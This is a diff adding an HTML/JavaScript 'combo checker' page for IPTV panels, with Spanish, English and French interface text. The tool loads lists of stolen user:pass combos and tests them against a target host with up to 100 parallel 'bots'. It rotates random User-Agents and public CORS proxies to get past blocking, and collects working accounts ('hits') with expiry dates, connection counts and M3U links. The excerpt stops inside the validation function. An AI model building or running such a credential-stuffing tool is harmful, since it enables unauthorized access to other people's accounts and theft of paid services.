@@ -1,0 +1,1202 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>🎾 Gaboo IPTV 🎾</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
+  :root {
+    --accent-start: #00FFFF; /* aqua */
+    --accent-end:   #00FFFF; /* aqua */
+    --accent-gradient: linear-gradient(180deg,var(--accent-start),var(--accent-end));
+
+    --dark-bg: #0f1117;
+    --input-bg: #111;
+  }
+  body {
+    background: var(--dark-bg);
+    color: #27F58E;
+    font-family: 'Orbitron', monospace, monospace;
+    margin: 0;
+    padding: 20px;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+  }
+
+  /* 🎾 Logo scintillant (añil) */
+  h1 {
+    text-align: center;
+    font-size: 2rem;
+    background: var(--accent-gradient);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    border: 2px solid transparent;
+    border-radius: 12px;
+    padding: 12px 20px;
+    margin: 0;
+    user-select: none;
+    animation: neonFlicker 1.5s infinite;
+    min-width: 260px;
+  }
+  @keyframes neonFlicker {
+    0%, 18%, 22%, 25%, 53%, 57%, 100% {
+      text-shadow: 0 0 8px rgba(168,85,247,.7), 0 0 14px rgba(34,211,238,.7);
+      border-color: var(--accent-start);
+    }
+    20%, 24%, 55% {
+      text-shadow: none;
+      border-color: #27F5B0;
+    }
+  }
+
+  /* ✅ Sélecteur langue SOUS le cadre, à droite (pastille) */
+  .lang-row{
+    display:flex;
+    justify-content:flex-end;
+    align-items:center;
+    margin-top:6px;
+    margin-bottom:14px;
+  }
+  .lang-pill{
+    background:#000;
+    border:2px solid transparent;
+    background: var(--accent-gradient);
+    color:#27F58E;
+    border-radius:9999px;
+    padding:6px 28px 6px 14px;
+    font-family:'Orbitron', monospace;
+    font-size:0.95rem;
+    box-shadow:0 0 12px rgba(168,85,247,.6), inset 0 0 6px rgba(34,211,238,.35);
+    outline:none;
+    appearance:none;
+    cursor:pointer;
+  }
+
+  label { font-weight: bold; margin-top: 15px; display: block;
+    background: var(--accent-gradient);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+  }
+
+  /* Inputs + Textarea même style */
+  input[type="text"], input[type="number"], input[type="file"], textarea#comboText {
+    background: var(--input-bg); border: 2px solid transparent; border-radius: 10px;
+    box-shadow: 0 0 8px rgba(168,85,247,.5), 0 0 8px rgba(34,211,238,.5) inset;
+    color: #e6f3ff; font-family: 'Orbitron', monospace;
+    font-size: 1rem; padding: 10px; width: 100%; max-width: 500px; box-sizing: border-box;
+    transition: border-color .3s, box-shadow .3s;
+  }
+textarea#comboText {
+  background: #000; 
+  border: 2px solid transparent;
+  border-radius: 12px;
+  padding: 12px;
+  color: #27A9F5;
+  font-family: 'Orbitron', monospace;
+  font-size: 1rem;
+  width: 100%;
+  max-width: 500px;
+  box-sizing: border-box;
+
+  /* Brillance animée */
+  box-shadow: 0 0 12px rgba(168,85,247,.6), 0 0 18px rgba(34,211,238,.45);
+  animation: neonGlow 3s ease-in-out infinite alternate;
+}
+
+@keyframes neonGlow {
+  0% {
+    box-shadow: 
+      0 0 6px rgba(168,85,247,.5), 
+      0 0 12px rgba(34,211,238,.3);
+    border-color: rgba(168,85,247,.4);
+  }
+  100% {
+    box-shadow: 
+      0 0 14px rgba(168,85,247,.9), 
+      0 0 24px rgba(34,211,238,.7);
+    border-color: rgba(34,211,238,.7);
+  }
+}
+  button {
+    margin-top: 15px; padding: 12px 20px; max-width: 500px; font-size: 1.1rem; font-weight: bold;
+    font-family: 'Orbitron', monospace; color: #fff; 
+    background: var(--accent-gradient);
+    border: none; border-radius: 10px; cursor: pointer;
+    box-shadow: 0 0 12px rgba(168,85,247,.6), 0 0 18px rgba(34,211,238,.45);
+    transition: transform .2s, box-shadow .2s; user-select: none;
+  }
+  button:hover:not(:disabled){ transform: scale(1.03);
+    box-shadow: 0 0 22px rgba(168,85,247,.8), 0 0 28px rgba(34,211,238,.6);
+  }
+  button:disabled{ background:#222; color:#555; cursor:not-allowed; }
+
+  /* Progress containers */
+  #progressContainer, #progressContainer2, #progressContainer3 {
+    margin-top:20px; max-width:500px; border:2px solid transparent; border-radius:10px; padding:10px;
+    box-shadow:0 0 12px rgba(168,85,247,.6), 0 0 18px rgba(34,211,238,.45);
+  }
+  #progressBar { background:var(--input-bg); border-radius:10px; height:20px; overflow:hidden; }
+  #progressBarFill, #progressBarFill2, #progressBarFill3 { background: var(--accent-gradient); height:100%; width:0%; transition:width .3s ease; }
+
+  #progressText, #progressText2, #progressText3 { margin-top:5px; font-size:14px;
+    background: var(--accent-gradient);
+    -webkit-background-clip: text; background-clip: text; color: transparent;
+  }
+  #currentCombo, #currentCombo2, #currentCombo3 {
+    margin-top: 5px; font-size: 13px;
+    background: var(--accent-gradient);
+    -webkit-background-clip: text; background-clip: text; color: transparent;
+    min-height: 22px; line-height: 22px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+  }
+
+  .turquoise-hit { color: green; text-shadow: 0 0 8px yellow, 0 0 15px green; font-weight: 700; }
+
+  #hitsCount { margin-top: 15px; max-width: 900px; font-weight: bold;
+    background: var(--accent-gradient);
+    -webkit-background-clip: text; background-clip: text; color: transparent;
+  }
+  #hitsContainer {
+    margin-top: 15px; max-width: 900px; flex-grow: 1; overflow-y: auto; background: var(--input-bg);
+    padding: 15px; border-radius: 15px; font-size: 14px;
+    box-shadow: 0 0 12px rgba(168,85,247,.6), 0 0 18px rgba(34,211,238,.45);
+    color: #e6f3ff;
+  }
+  .hit-block { border:2px solid transparent; padding:12px; margin-bottom:12px; border-radius:12px; background:#000;
+    transition:background .3s, box-shadow .3s; display:flex; flex-direction:column;
+    box-shadow: 0 0 12px rgba(168,85,247,.6), 0 0 18px rgba(34,211,238,.45);
+  }
+  .hit-block:hover{ background:#1a1025; box-shadow: 0 0 20px rgba(168,85,247,.8), 0 0 28px rgba(34,211,238,.6); }
+  .hit-header{ font-weight:bold; margin-bottom:6px;
+    background: var(--accent-gradient);
+    -webkit-background-clip: text; background-clip: text; color: transparent;
+  }
+  .hit-content{ white-space:pre-wrap; color:#cfe9ff; text-shadow: 0 0 4px rgba(34,211,238,.5); }
+  .cors-row{ display:flex; align-items:center; gap:8px; margin-top:10px; }
+  .opts { display: flex; flex-direction: column; gap: 6px; margin: 8px 0 2px; }
+
+.jobTop {
+  display:flex;
+  align-items:center;
+  justify-content:flex-start; /* en haut à gauche */
+  margin-bottom:8px;
+}
+.hitsCount {
+  font-weight:700;
+  background: var(--accent-gradient);
+  -webkit-background-clip: text; background-clip: text; color: transparent;
+  font-size:0.95rem;
+}
+input[type="file"] {
+  position: relative;
+  overflow: hidden;
+  border-radius: 10px;
+}
+
+/* Effet de brillance */
+input[type="file"]::before {
+  content: "";
+  position: absolute;
+  top: 0; right: -75%; /* commence à droite */
+  width: 50%;
+  height: 100%;
+  background: linear-gradient(120deg, transparent, rgba(255,255,255,0.4), transparent);
+  transform: skewX(-20deg);
+  animation: shineMove 6s infinite; /* ⬅️ animation plus lente */
+}
+
+/* Animation: traverse de droite vers gauche */
+@keyframes shineMove {
+  0%   { right: -75%; }
+  50%  { right: 125%; }
+  100% { right: -75%; }
+}
+/* Conteneur du titre */
+.title-box {
+  position: relative;
+  display: inline-block;
+  padding: 20px 40px;
+  border-radius: 15px;
+  background: #000; /* fond noir */
+  font-family: 'Orbitron', sans-serif;
+  color: #a855f7; /* texte violet clair */
+  text-align: center;
+  font-size: 2.5rem;
+  z-index: 1;
+}
+
+/* Bord brillant animé */
+.title-box::before {
+  content: "";
+  position: absolute;
+  inset: 0;
+  border-radius: 15px;
+  padding: 3px;
+  background: linear-gradient(270deg, #a855f7, #22d3ee, #a855f7);
+  background-size: 300% 300%;
+  animation: borderFlow 8s linear infinite;
+  -webkit-mask: 
+    linear-gradient(#fff 0 0) content-box, 
+    linear-gradient(#fff 0 0);
+  -webkit-mask-composite: xor;
+          mask-composite: exclude;
+  pointer-events: none;
+  z-index: -1;
+}
+
+/* Texte lumineux */
+.title-box span {
+  display: block;
+  font-size: 2rem;
+  background: linear-gradient(90deg, #a855f7, #22d3ee);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  text-shadow: 0 0 20px rgba(168,85,247,0.8),
+               0 0 40px rgba(34,211,238,0.6);
+}
+
+@keyframes borderFlow {
+  0%   { background-position: 0% 50%; }
+  50%  { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
+}
+/* Style spécial pour les hits (ou input file) */
+.hit-block {
+  position: relative;
+  overflow: hidden;
+  border-radius: 10px;
+}
+
+/* Effet de brillance diagonal ↘️ vers ↖️ */
+.hit-block::before {
+  content: "";
+  position: absolute;
+  bottom: -75%;   
+  right: -75%;    
+  width: 80%;
+  height: 80%;
+  background: linear-gradient(
+    135deg, 
+    transparent, 
+    rgba(255,255,255,0.5), 
+    transparent
+  );
+  transform: skewX(-20deg);
+  animation: shineDiagonal 6s ease-in-out infinite;
+  pointer-events: none;
+}
+
+/* Animation : bas-droit → haut-gauche avec pause */
+@keyframes shineDiagonal {
+  0%   { bottom: -75%; right: -75%; opacity: 0; }
+  10%  { opacity: 1; }
+  50%  { bottom: 125%; right: 125%; opacity: 1; }
+  60%  { opacity: 0; }
+  100% { bottom: 125%; right: 125%; opacity: 0; } /* pause avant restart */
+}
+</style>
+</head>
+<body>
+
+<h1>🎾 Gaboo 🎾</h1>
+<div class="lang-row">
+  <select id="langSelect" class="lang-pill">
+    <option value="es" selected>ES</option>
+    <option value="en">EN</option>
+    <option value="fr">FR</option>
+  </select>
+</div>
+
+<label for="hostInput" id="lblHost"></label>
+<input type="text" id="hostInput" placeholder="" autocomplete="off" />
+
+<!-- === 3 fichiers combos (au lieu d’un seul) === -->
+<label id="lblCombo"></label>
+<input type="file" id="comboFile1" accept=".txt" style="margin-bottom:8px" />
+<input type="file" id="comboFile2" accept=".txt" style="margin-bottom:8px" />
+<input type="file" id="comboFile3" accept=".txt" 
+style="margin-bottom:8px" />
+
+<!-- (NOUVEAU) Zone texte libre : colle tes combos ici -->
+<label id="lblComboText">…ou coller des combos (texte libre)</label>
+<textarea id="comboText" rows="6" placeholder="Paste any text here; user:pass is automatically detected (one per line or in the middle of a line)."></textarea>
+
+<label for="concurrencyInput" id="lblConc"></label>
+<input type="number" id="concurrencyInput" min="1" max="100" value="80" />
+
+<div class="opts">
+  <div class="cors-row">
+    <label><input type="checkbox" id="useCors" checked /> <span id="lblUseCors"></span></label>
+  </div>
+  <div class="cors-row">
+    <label><input type="checkbox" id="soundToggle" checked /> <span id="lblSound"></span></label>
+  </div>
+  <div class="cors-row">
+    <label><input type="checkbox" id="autoDownload" checked /> <span id="lblAutoDL"></span></label>
+  </div>
+</div>
+
+<button id="startBtn" disabled></button>
+<button id="stopBtn" disabled></button>
+<button id="saveBtn" disabled></button>
+
+<!-- === Barre Job 1 === -->
+<div id="progressContainer">
+  <div class="jobTop">
+    <div id="hitsCount1" class="hitsCount"></div>
+  </div>
+  <div id="progressBar"><div id="progressBarFill"></div></div>
+  <div id="progressText"></div>
+  <div id="currentCombo"></div>
+</div>
+
+<!-- === Barre Job 2 === -->
+<div id="progressContainer2">
+  <div class="jobTop">
+    <div id="hitsCount2" class="hitsCount"></div>
+  </div>
+  <div id="progressBar"><div id="progressBarFill2"></div></div>
+  <div id="progressText2"></div>
+  <div id="currentCombo2"></div>
+</div>
+
+<!-- === Barre Job 3 === -->
+<div id="progressContainer3">
+  <div class="jobTop">
+    <div id="hitsCount3" class="hitsCount"></div>
+  </div>
+  <div id="progressBar"><div id="progressBarFill3"></div></div>
+  <div id="progressText3"></div>
+  <div id="currentCombo3"></div>
+</div>
+
+<!-- === Barre Job 4 === -->
+<div id="progressContainer4">
+  <div class="jobTop">
+    <div id="hitsCount4" class="hitsCount"></div>
+  </div>
+  <div id="progressBar"><div id="progressBarFill4"></div></div>
+  <div id="progressText4"></div>
+  <div id="currentCombo4"></div>
+
+<!-- ✅ Résultats globaux (tous les jobs réunis) -->
+<div id="hitsContainer"></div>
+
+<footer style="text-align:center; margin-top:30px; font-size:12px; color:#00fff7; font-family:'Orbitron', monospace; user-select:none;" id="footerMade"></footer>
+<script>
+// Génère un User-Agent aléatoire
+function randomUA(){
+  const uas = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
+  ];
+  return uas[Math.floor(Math.random()*uas.length)];
+}
+// Crée une session dédiée par worker
+function createSession(){
+  return {
+    headers: {
+      "User-Agent": randomUA(),
+      "Accept": "application/json, text/javascript,*/*;q=0.9"
+    },
+    cookies: {}
+  };
+}
+// Exemple pour injecter cookies dynamiques
+function attachCookies(opts, session){
+  const cookieStr = Object.entries(session.cookies||{}).map(([k,v])=>`${k}=${v}`).join("; ");
+  if(cookieStr){
+    opts.headers = { ...(opts.headers||{}) };
+    opts.headers.Cookie = cookieStr;
+  }
+  return opts;
+}
+
+/* ===== i18n ===== */
+const i18n = {
+  es: {
+    hostLabel:"Panel (host con o sin http/https):", hostPH:"ej: lista.com:8080",
+    comboLabel:"Elige archivo .txt con combos (user:pass):",
+    comboTextLabel:"…o pega combos (texto libre)",
+    concLabel:"Número de conexiones paralelas (bots):",
+    useCors:"Usar proxy CORS", sound:"🔉 Sonido al encontrar hit",
+    autoDL:"⬇️ Descargar resultados al finalizar",
+    start:"Iniciar Scan", stop:"Detener Scan", save:"Guardar en el teléfono (.txt)",
+    waiting:"Esperando inicio...", resolving:"Resolviendo IP...", starting:"Iniciando scan...",
+    currentUser:"Usuario actual", processed:"Procesados", hitsFound:"Hits encontrados",
+    scanStopped:" | Scan detenido.", scanDone:" | Scan finalizado.",
+    noHits:"No hay hits", footer:"Hecho por Gaboo",
+    title:"🎾 Gaboo 🎾", ip:"IP", host:"Host", port:"Puerto", user:"Usuario", pass:"Contraseña",
+    created:"Creada", expires:"Expira", status:"Estado", statusActive:"Active", statusUnknown:"Desconocido",
+    maxConn:"Conexiones máximas", actConn:"Conexiones activas",
+    categories:"📺 IPTV Categories:", none:"N/D", link:"🔗Link M3U",
+    groupsA:"🗣Grupo: https://t.me/+japhlpdroyYzYWJk", groupsB:"🗣Grupo: https://t.me/+XmT5CjFVOIJmNjc0",
+    categoriesRule:"━━━━━━━━━━━━━━━", more:"más"
+  },
+  en: {
+    hostLabel:"Panel (host with or without http/https):", hostPH:"e.g., lista.com:8080",
+    comboLabel:"Choose .txt file with combos (user:pass):",
+    comboTextLabel:"…or paste combos (free text)",
+    concLabel:"Number of parallel connections (bots):",
+    useCors:"Use CORS proxy", sound:"🔉 Sound on hit",
+    autoDL:"⬇️ Auto-download results on finish",
+    start:"Start Scan", stop:"Stop Scan", save:"Save to phone (.txt)",
+    waiting:"Waiting to start...", resolving:"Resolving IP...", starting:"Starting scan...",
+    currentUser:"Current user", processed:"Processed", hitsFound:"Hits found",
+    scanStopped:" | Scan stopped.", scanDone:" | Scan finished.",
+    noHits:"No hits", footer:"Made by Gaboo",
+    title:"🎾 Gaboo IPTV 🎾", ip:"IP", host:"Host", port:"Port", user:"User", pass:"Password",
+    created:"Created", expires:"Expires", status:"Status", statusActive:"Active", statusUnknown:"Unknown",
+    maxConn:"Max connections", actConn:"Active connections",
+    categories:"📺 IPTV Categories:", none:"N/A", link:"🔗M3U Link",
+    groupsA:"🗣Group: https://t.me/+japhlpdroyYzYWJk", groupsB:"🗣Group: https://t.me/+XmT5CjFVOIJmNjc0",
+    categoriesRule:"━━━━━━━━━━━━━━━", more:"more"
+  },
+  fr: {
+    hostLabel:"Panneau (hôte avec ou sans http/https) :", hostPH:"ex : lista.com:8080",
+    comboLabel:"Choisir un fichier .txt avec combos (user:pass) :",
+    comboTextLabel:"…ou coller des combos (texte libre)",
+    concLabel:"Nombre de connexions parallèles (bots) :",
+    useCors:"Utiliser un proxy CORS", sound:"🔉 Son dès qu’un hit est trouvé",
+    autoDL:"⬇️ Télécharger les résultats à la fin",
+    start:"Démarrer le scan", stop:"Arrêter le scan", save:"Enregistrer sur le téléphone (.txt)",
+    waiting:"En attente de démarrage…", resolving:"Résolution de l’IP…", starting:"Démarrage du scan…",
+    currentUser:"Utilisateur actuel", processed:"Traités", hitsFound:"Hits trouvés",
+    scanStopped:" | Scan arrêté.", scanDone:" | Scan terminé.",
+    noHits:"Aucun hit", footer:"Fait par IGOR",
+    title:"🎾 Gaboo 🎾", ip:"IP", host:"Hôte", port:"Port", user:"Utilisateur", pass:"Mot de passe",
+    created:"Créé le", expires:"Expire le", status:"Statut", statusActive:"Actif", statusUnknown:"Inconnu",
+    maxConn:"Connexions max", actConn:"Connexions actives",
+    categories:"📺 Catégories IPTV :", none:"N/D", link:"🔗Lien M3U",
+    groupsA:"🗣Groupe : https://t.me/+japhlpdroyYzYWJk", groupsB:"🗣Groupe : https://t.me/+XmT5CjFVOIJmNjc0",
+    categoriesRule:"━━━━━━━━━━━━━━━", more:"de plus"
+  }
+};
+
+let LANG='es'; // 🇲🇽 ES par défaut
+const $ = id => document.getElementById(id);
+const t = k => (i18n[LANG] && i18n[LANG][k]) ?? k;
+
+/* ===== DOM ===== */
+const hostInput = $('hostInput');
+const concurrencyInput = $('concurrencyInput');
+const startBtn = $('startBtn'), stopBtn = $('stopBtn'), saveBtn = $('saveBtn');
+const useCors = $('useCors'), soundToggle = $('soundToggle'), autoDownload = $('autoDownload');
+const langSelect = $('langSelect');
+
+// ✅ Compteurs séparés (1 par analyse)
+const hitsCount1 = $('hitsCount1');
+const hitsCount2 = $('hitsCount2');
+const hitsCount3 = $('hitsCount3');
+
+// ✅ Un seul container global (tous les résultats en bas)
+const hitsContainer = $('hitsContainer');
+
+// Barres + "utilisateur actuel" par Job
+const progressBarFill  = $('progressBarFill'),  progressText  = $('progressText'),  currentCombo  = $('currentCombo');
+const progressBarFill2 = $('progressBarFill2'), progressText2 = $('progressText2'), currentCombo2 = $('currentCombo2');
+const progressBarFill3 = $('progressBarFill3'), progressText3 = $('progressText3'), currentCombo3 = $('currentCombo3');
+
+const lblHost = $('lblHost'), lblCombo = $('lblCombo'), lblConc = $('lblConc');
+const lblUseCors = $('lblUseCors'), lblSound = $('lblSound'), lblAutoDL = $('lblAutoDL');
+const lblComboText = $('lblComboText');
+const footerMade = $('footerMade');
+
+// === État général ===
+let isRunning = false;
+let stopRequested = false;
+let serverIP = null, serverGeo = null;
+
+// 3 listes de combos
+let combos1 = [], combos2 = [], combos3 = [], combos4 = [];
+
+// + (NOUVEAU) liste issue de la zone texte
+let combosTxt = [];
+
+// 🔄 Hits séparés par job
+const HITS = { 1: [], 2: [], 3: [], 4: [],};
+
+function fetchTimeout(url, opts={}, ms=7000){
+  return new Promise((resolve, reject)=>{
+    const ctrl = new AbortController();
+    const id = setTimeout(()=>{ 
+      ctrl.abort(); 
+      reject(new Error('timeout')); 
+    }, ms);
+
+    fetch(url, { ...opts, signal: ctrl.signal })
+      .then(r=>{ clearTimeout(id); resolve(r); })
+      .catch(e=>{ clearTimeout(id); reject(e); });
+  });
+}
+
+let JOB_PROXIES = {};   // jobId -> template proxy CORS choisi
+const PROXY_FAILS = new Map();         // tpl -> { n, until }
+const PROXY_MAX_FAILS = 3;             // après 3 échecs
+const PROXY_COOLDOWN_MS = 60_000;      // on le met au frigo 60 s
+
+function proxyIsCold(tpl){
+  const s = PROXY_FAILS.get(tpl);
+  return s && s.until && Date.now() < s.until;
+}
+function noteProxyFail(tpl){
+  const s = PROXY_FAILS.get(tpl) || { n:0, until:0 };
+  s.n++;
+  if(s.n >= PROXY_MAX_FAILS){
+    s.until = Date.now() + PROXY_COOLDOWN_MS;
+    s.n = 0;
+  }
+  PROXY_FAILS.set(tpl, s);
+}
+function noteProxyOk(tpl){
+  PROXY_FAILS.delete(tpl);
+}
+
+/* ===== Langue ===== */
+function applyLang(){
+  lblHost.textContent    = t('hostLabel'); 
+  hostInput.placeholder  = t('hostPH');
+  lblCombo.textContent   = t('comboLabel'); 
+  lblConc.textContent    = t('concLabel');
+  lblUseCors.textContent = t('useCors'); 
+  lblSound.textContent   = t('sound'); 
+  lblAutoDL.textContent  = t('autoDL');
+  if(lblComboText) lblComboText.textContent = t('comboTextLabel');
+
+  startBtn.textContent = t('start'); 
+  stopBtn.textContent  = t('stop'); 
+  saveBtn.textContent  = t('save');
+  footerMade.textContent = t('footer');
+
+  if(!isRunning){
+    progressText.textContent  = t('waiting'); 
+    currentCombo.textContent  = `${t('currentUser')}: -`;
+
+    progressText2.textContent = t('waiting'); 
+    currentCombo2.textContent = `${t('currentUser')}: -`;
+
+    progressText3.textContent = t('waiting'); 
+    currentCombo3.textContent = `${t('currentUser')}: -`;
+  }
+
+  // 🔄 3 compteurs de hits indépendants
+  hitsCount1.innerHTML = `${t('hitsFound')}: <span class="green-hit">${HITS[1]?.length||0}</span>`;
+  hitsCount2.innerHTML = `${t('hitsFound')}: <span class="yellow-hit">${HITS[2]?.length||0}</span>`;
+  hitsCount3.innerHTML = `${t('hitsFound')}: <span class="yblue-hit">${HITS[3]?.length||0}</span>`;
+}
+
+langSelect.addEventListener('change', ()=>{
+  LANG = langSelect.value;
+  document.documentElement.setAttribute('lang', LANG);
+  applyLang();
+});
+
+/* ===== Audio HIT (Web Audio) ===== */
+let audioCtx=null;
+function unlockAudio(){
+  try{
+    if(audioCtx) return;
+    const Ctx=window.AudioContext||window.webkitAudioContext;
+    if(!Ctx) return;
+    audioCtx=new Ctx();
+    const o=audioCtx.createOscillator(), g=audioCtx.createGain();
+    g.gain.value=0; o.connect(g); g.connect(audioCtx.destination); o.start(); o.stop(audioCtx.currentTime+0.01);
+  }catch(_){}
+}
+function playHitSound(){
+  if(!soundToggle.checked || !audioCtx) return;
+  try{
+    const o=audioCtx.createOscillator(), g=audioCtx.createGain();
+    o.type='sine'; o.frequency.setValueAtTime(880, audioCtx.currentTime);
+    g.gain.setValueAtTime(0, audioCtx.currentTime);
+    g.gain.linearRampToValueAtTime(0.22, audioCtx.currentTime+0.01);
+    g.gain.exponentialRampToValueAtTime(0.0008, audioCtx.currentTime+0.18);
+    o.connect(g); g.connect(audioCtx.destination); o.start(); o.stop(audioCtx.currentTime+0.2);
+    if(navigator.vibrate) try{ navigator.vibrate(80); }catch(_){}
+  }catch(_){}
+}
+
+/* ===== Utilitaires ===== */
+function limpiarHost(host){ return host.replace(/^https?:\/\//,'').trim(); }
+
+function uiFor(job){
+  if(job === 1) return {
+    fill: progressBarFill,
+    text: progressText,
+    user: currentCombo,
+    hitsCountEl: hitsCount1,
+    hitsArr: HITS[1]
+  };
+  if(job === 2) return {
+    fill: progressBarFill2,
+    text: progressText2,
+    user: currentCombo2,
+    hitsCountEl: hitsCount2,
+    hitsArr: HITS[2]
+  };
+  return {
+    fill: progressBarFill3,
+    text: progressText3,
+    user: currentCombo3,
+    hitsCountEl: hitsCount3,
+    hitsArr: HITS[3]
+  };
+}
+function actualizarProgresoJob(state, ui){
+  const { processed, total } = state;
+  const pct = total===0 ? 0 : (processed/total)*100;
+  if(ui.fill) ui.fill.style.width = pct + '%';
+  if(ui.text) ui.text.textContent =
+    `${t('processed')}: ${processed} / ${total} | ${t('hitsFound')}: ${ui.hitsArr.length}`;
+  if(ui.hitsCountEl) ui.hitsCountEl.innerHTML =
+    `${t('hitsFound')}: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
+}
+// Centralise l’état du bouton Start (host + au moins 1 source)
+function updateStartState(){
+  const hasHost = !!hostInput.value.trim();
+  const hasAnyCombos = (combos1.length || combos2.length || combos3.length || combosTxt.length);
+  startBtn.disabled = !(hasHost && hasAnyCombos);
+}
+
+async function resolveIP(domain){
+  try{
+    const clean = domain.split(':')[0];
+    if(/^\d+\.\d+\.\d+\.\d+$/.test(clean)) return clean;
+    const res = await fetch(`https://dns.google/resolve?name=${clean}&type=A`);
+    if(!res.ok) return null;
+    const data = await res.json();
+    return data.Answer?.find(a=>a.type===1)?.data || null;
+  }catch{ return null; }
+}
+async function fetchGeo(ip){
+  try{
+    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,city`);
+    if(!res.ok) return null;
+    const data=await res.json();
+    if(data.status!=='success') return null;
+    return { ip, country:data.country||t('none'), city:data.city||t('none'), flag:flagEmoji(data.countryCode||'UN') };
+  }catch{ return null; }
+}
+function flagEmoji(cc){ return cc.toUpperCase().replace(/./g,c=>String.fromCodePoint(127397+c.charCodeAt())); }
+
+/* ===== Réseau (timeout + proxy CORS) ===== */
+async function fetchTimeout(resource, options={}){
+  const {timeout=6000}=options;  // V6 gardait 6s
+  const controller=new AbortController();
+  const id=setTimeout(()=>controller.abort(), timeout);
+  try{ const res=await fetch(resource,{...options,signal:controller.signal}); clearTimeout(id); return res; }
+  catch(e){ clearTimeout(id); throw e; }
+}
+const CORS_PROXIES = [
+  // déjà connus
+  'https://cors.isomorphic-git.org/{url}',
+  'https://thingproxy.freeboard.io/fetch/{url}',
+  'https://api.allorigins.win/raw?url={url}',
+
+  // alternatives
+  'https://corsproxy.io/?{url}',                       // stable, rapide
+  'https://api.codetabs.com/v1/proxy/?quest={url}',   // simple, pas toujours dispo
+  'https://yacdn.org/proxy/{url}',                    // bon fallback
+  'https://api.s0n1c.org/cors?url={url}',             // moins connu
+  'https://api.scraperapi.com/?url={url}'             // limité, mais fonctionne
+];
+function proxify(tpl,targetUrl){ return tpl.includes('{url}') ? tpl.replace('{url}',encodeURIComponent(targetUrl)) : (tpl+targetUrl); }
+// ⚡ Proxy fixe par job AVEC repli si ça échoue
+// Proxy fixe par job + fallback (+ circuit breaker si défini)
+async function fetchWithCors(url, options = {}, jobId = null){
+  const baseOpts = { cache:'no-store', keepalive:false, ...options };
+
+  // 1) Proxy fixe du job (si défini et pas en cooldown)
+  if(jobId && JOB_PROXIES[jobId]){
+    const fixedTpl = JOB_PROXIES[jobId];
+
+    // si tu as mis le circuit breaker :
+    if (typeof proxyIsCold === 'function' && proxyIsCold(fixedTpl)) {
+      // on saute ce proxy pour l’instant
+    } else {
+      try{
+        const proxied = fixedTpl.replace('{url}', encodeURIComponent(url));
+        const r = await fetchTimeout(proxied, baseOpts);
+        if(r && r.ok){ if(typeof noteProxyOk==='function') noteProxyOk(fixedTpl); return r; }
+        if(typeof noteProxyFail==='function') noteProxyFail(fixedTpl);
+      }catch(_){ if(typeof noteProxyFail==='function') noteProxyFail(fixedTpl); }
+    }
+  }
+
+  // 2) Tentative directe (si CORS OK côté cible)
+  try{
+    const r = await fetchTimeout(url, baseOpts);
+    if(r && r.ok) return r;
+  }catch(e){
+    if(!useCors.checked) throw e; // si CORS OFF, on ne proxifie pas
+  }
+
+  // 3) Rotation sur les autres proxys (exclut le proxy fixe du job et ceux en cooldown)
+  const pool = (Array.isArray(CORS_PROXIES) ? [...CORS_PROXIES] : []).filter(tpl=>{
+    if(jobId && JOB_PROXIES[jobId] === tpl) return false;
+    return !(typeof proxyIsCold==='function' && proxyIsCold(tpl));
+  });
+
+  for(const tpl of pool.sort(()=>Math.random()-0.5)){
+    try{
+      const proxied = tpl.replace('{url}', encodeURIComponent(url));
+      const r = await fetchTimeout(proxied, baseOpts);
+      if(r && r.ok){ if(typeof noteProxyOk==='function') noteProxyOk(tpl); return r; }
+      if(typeof noteProxyFail==='function') noteProxyFail(tpl);
+    }catch(_){ if(typeof noteProxyFail==='function') noteProxyFail(tpl); }
+  }
+
+  throw new Error('Fetch failed');
+}
+async function getJson(url, options = {}, jobId = null){
+  const r = await fetchWithCors(url, options, jobId);
+  if(!r.ok) throw new Error('Bad');
+  return await r.json();
+}
+
+/* ===== Affichage catégories ===== */
+function summarizeCategories(cats, limit=40){
+  if(!Array.isArray(cats)||!cats.length) return `${t('categoriesRule')}\n• ${t('none')}`;
+  const names=cats.map(c=>c.category_name||c.name||'').filter(Boolean);
+  const shown=names.slice(0,limit);
+  const lines=shown.map(n=>`• ${n}`);
+  if(names.length>limit){ const rest=names.length-limit; lines.push(`• … (+${rest} ${t('more')})`); }
+  return `${t('categoriesRule')}\n${lines.join('\n')}`;
+}
+
+/* ===== Parse permissif ===== */
+// Normalise et extrait le 1er "user:pass" d'une ligne bruitée (emojis/espaces exotiques ok)
+function extractCombo(line){
+  if(!line) return null;
+  let s = String(line).normalize('NFKC'); // normalise Unicode
+  s = s.replace(/\s+/g,' ').trim();
+  const m = s.match(/([^:\s][^:\n\r]*)\s*:\s*([^:\s][^\n\r]*)/u);
+  if(!m) return null;
+  const user = m[1].trim();
+  const pass = m[2].trim();
+  if(!user || !pass) return null;
+  return [user, pass];
+}
+
+/* ===== Validation d’un combo (support UI par job) ===== */
+async function validarCombo(host, combo, opts = {}, session = null, ui = null, jobId = null){
+  try{
+    if(stopRequested) return null;
+
+    // combo peut venir d’un fichier OU de la zone texte (on re-extrait proprement)
+    const pair = Array.isArray(combo) ? combo : extractCombo(combo);
+    if(!pair) return null;
+    const [user, pass] = pair;
+
